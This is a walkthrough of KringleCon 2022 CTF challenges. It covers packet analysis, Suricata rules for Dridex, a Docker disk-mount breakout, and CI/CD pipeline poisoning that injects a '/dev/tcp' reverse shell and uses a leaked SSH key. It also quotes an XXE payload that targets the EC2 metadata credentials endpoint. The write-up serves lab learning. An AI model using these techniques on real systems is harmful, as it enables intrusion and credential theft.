# KringleCon 2022 Report
## Tolkien Ring
### Wireshark Practice
1.
- So the most common object is http, so i tried and... yeah.
- Answer: `http`
2. 
- Wireshark -> File -> Export Objects -> HTTP...
- We can see here that the biggest file is the app.php file..
- Answer: `app.php`
3.
- Wireshark -> File -> Export Objects -> HTTP...
- We can also see here the packet number.
- Answer: `687`
4.
- Wireshark -> File -> Export Objects -> HTTP...
- If we click on the app.php, wireshark will display the packet, and we can see in the source the IP.
- Answer: `192.185.57.242`
5.
- Wireshark -> File -> Export Objects -> HTTP... -> app.php (The larger one) -> Save
- If we explore the app.php file we can see in the javascript function that it save a file from the blob to the host with the following file name.
- Answer: `Ref_Sept24-2020.zip`
6.
- We can set the following filter to wireshark `tls.handshake.type == 2` for filtering the "Server Hello".
- Wireshark -> Edit -> Find Packet...
- We set the filter to `Packet Details`, check the `Case sensitive`, `String` and the searched string is `CountryName:`.
- If we click on the find button again and again, we can see all the country codes (US, IL, SS).
- We can go for example to https://countrycode.org/ and search for the country codes we found.
- Answer: `United States, Israel, South Sudan`
7.
- I think so.
- Answer: `Yes`

### Windows Event Logs
- This one is little bit harder so i will just say the answers, it's good to work with the actual Windows Event Log app.
1.
- Answer: `12/24/2022`
2.
- Answer: `Recipe.txt`
3.
- Answer: `$foo = Get-Content .\Recipe| % {$_ -replace 'honey', 'fish oil'}`
4.
- Answer: `$foo | Add-Content -Path 'Recipe'`
5.
- Answer: `Recipe.txt`
6.
- Answer: `Yes`
7.
- Answer: `No`
8.
- Answer: `4104`
9.
- Answer: `Yes`
10.
- Answer: `honey`

### Suricata Regatta
- Documentation: https://suricata.readthedocs.io/en/suricata-6.0.0/rules/intro.html
1.
- So first we need to catch the DNS lookups for this `adv.epostoday.uk`.
- Add `alert dns any any -> any any (msg:"Known bad DNS lookup, possible Dridex infection"; dns.query; content:"adv.epostoday.uk"; nocase; sid:1;)` to the `suricata.rules` file.

2.
- Ok, now we need to create a rule that catch the http communication between this IP `192.185.57.242` and with their "internal system", the `$HOME_NET`.
- We can find the `$HOME_NET` in the already set configurations.
- We need to catch the communication from both sides, thats why are going to use this `<>`.
- Add `alert http 192.185.57.242 any <> $HOME_NET any (msg:"Investigate suspicious connections, possible Dridex infection";sid:2;)` to the `suricata.rules` file.

3.
- Cool, now we need to add a rule that catch TLS certificates with a specific CN.
- Add `alert tls any any <> any any (msg:"Investigate bad certificates, possible Dridex infection";tls.subject:"CN=heardbellith.Icanwepeh.nagoya"; sid:3;)` to the `suricata.rules` file.

4.
- I know, the GZip thing sound kinda scary but if look in the documentation, we can see that the `http.response_body` already look for strings in possible gzips.
- Add `alert http any any -> any any (http.response_body;msg:"Suspicious JavaScript function, possible Dridex infection";content:"let byteCharacters = atob"; sid:4;)` to the `suricata.rules` file.

## Elfen Ring
### Clone with a Difference
- Basicly we just need to clone from this `git@haugfactory.com:asnowball/aws_scripts.git` gitlab repo.
- I just converted the ssh clone thing to https like this `https://haugfactory.com/asnowball/aws_scripts.git`.
- Now we can clone it `git clone https://haugfactory.com/asnowball/aws_scripts.git`.
- We can change the directory `cd aws_scripts`, and cat the `README.md` file.
- The last word there is `maintainers`.
- Just type this word in the `runtoanswer`.

### Prison Escape
- So i just find this guide on the *HackTricks* website [Docker Breakout](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#mounting-disk-poc1).
- If we do `sudo -l`, we can see we are already root.
- So we can check if there are any disks attached with the `sudo fisk -l` command.
- We can see here the `/dev/vda` disk, so we can just mount it `sudo mkdir -p /mnt/hola;sudo mount /dev/vda /mnt/hola`.
- We successfully mount the disk we can navigate to it `cd /mnt/hola` and find the flag `cat home/jailer/.ssh/jail.key.priv`.
- Yeee `082bb339ec19de4935867`.

### Jolly CI/CD
- Ok, so first things first this challange need realy some time to bake.
- In the meantime, you might have noticed that *Tinsel Upatree* leaked the git repository.
- I know it's stupid, but you can watch it (the 10 means the reload time in seconds) `watch -n 10 "git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git"`.
- Once you see *Updating files* stuff you are ready to go. Just remove the repo `rm -f -r wordpress.flag.net.internal` and clone it again properly `git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git`. Then you can navigete to it of course `cd wordpress.flag.net.internal`.
- This challange wants us to do some stuff with github. So we can automaticly just do the `git log` command.
- Ooh and this log *whoops* looks interesting. We can just do the `git show e19f653bde9ea3de6af21a587e41e7a909db1ca5`.
- And we found a ssh key. Dont forget to delete the *-* in each line.
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5
9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g
AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot
PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==
-----END OPENSSH PRIVATE KEY-----


```
- We can store it in a file. I don't like when the file is in the repository, so i just put it in the directory above with `nano ../id_rsa`. Dont forget the extra line on the end.
- Now we must give the standard permissions to the *id_rsa* file with `chmod 600 ../id_rsa`.
- Next step we must create a reverse shell to gitlab.
- So we include the reverse shell in the `.gitlab-ci.yml`. This file will run our reverse shell after pushing the repo.
- Just add a extra *-* line with the reverse shell under the existing one.
```
- sh -i >& /dev/tcp/172.18.0.99/4545 0>&1
```
- Next step we must stage the updated *.gitlab-ci.yml* file and commit it.
```bash
git add --all;git config --global user.name "foo";git commit -m "foo"
```
- Now we can start the *netcat* listener.
```bash
nc -lvnp 4545
```
- We can background it with Crtl-Z (*^Z*).
- Now we need to configure github to use the ssh key and not the token. So just export this variable.
```bash
export GIT_SSH_COMMAND='ssh -i /home/samways/id_rsa'
```
- Cool, now we can push it.
```bash
git push git@gitlab.flag.net.internal:/rings-of-powder/wordpress.flag.net.internal.git
```
- Now we cant wait for the reverse shell. Unbackground the netcat listener with `fg`.
- *Connection from 172.18.1.149 60740 received!* Y000000
- If you noticed in the *.gitlab-ci.yml* file, there was also a ssh command with some ssh key `ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy` so we can try to connect to it (the flag is on the wordress target not the gitlab so we haven't won yet).
```
ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy wordpress.flag.net.internal
```
- The flag is in the */* folder.
```bash
cat /flag.txt
```
- Flag: `oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT`

## Web Ring
### Naughty IP
- Unzip the zip file and open wireshark on the *victim.pcap* file.
- Wireshark -> Statistics -> Conversations
- Click twice on the *Packets* to order the items by the number of packets.
- And yep, one ip has *16603* packets.
- Answer: `18.222.86.32`

### Credential Mining
- So we can just filter the ip we found above in wireshark with the `ip.addr == 18.222.86.32` filter.
- We can add a *http* filter `ip.addr == 18.222.86.32 && http`.
- If we scroll a bit you can see the login post requests.
- Right click on the first one, Follow > HTTP Stream and **boom**.
- Answer: `alice`.

### 404 FTW
- Just apply this filter in wireshark to filter out just the communication with the target server, get request and show the http responses.
```
ip.addr == 18.222.86.32 && ip.src == 10.12.42.16 && http.request.method == GET || http.response
```
- If you scroll a bit you can see the *NOT FOUND* things. Thats the bruteforce attack.
- Find the first one with *200 OK (text/html)*, Follow > HTTP Stream.
- Answer: `/proc`

### IMDS, XXE, and Other Abbreviations
- This one is easier, *XXE Attacks* are related to xml. So we gonna just filter *xml* in wireshark.
```
ip.addr == 18.222.86.32 && xml
```
- Right click on the last packet, Follow > HTTP Stream.
- We can see here the payload `<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE foo [ <!ENTITY id SYSTEM "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"> ]>\n<product><productId>&id;</productId></product>`.
- Answer: `http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`.

### Open Boria Mine Door
- We just need to complete 3 of them.
- Ok, letters are boring so let's try *XSS*.
```
<style>body {background-color: white;}</style>
```
- Cool, now we can do this thing in the next two steps. Only the third box *background-color* doesn't work, so we'll use svg.
1. Answer: `<style>body {background-color: white;}</style>`
2. Answer: `<style>body {background-color: white;}</style>`
3. Answer: `<svg><rect width="300" height="400" fill="blue" /></svg>`

### Glamtariel's Fountain
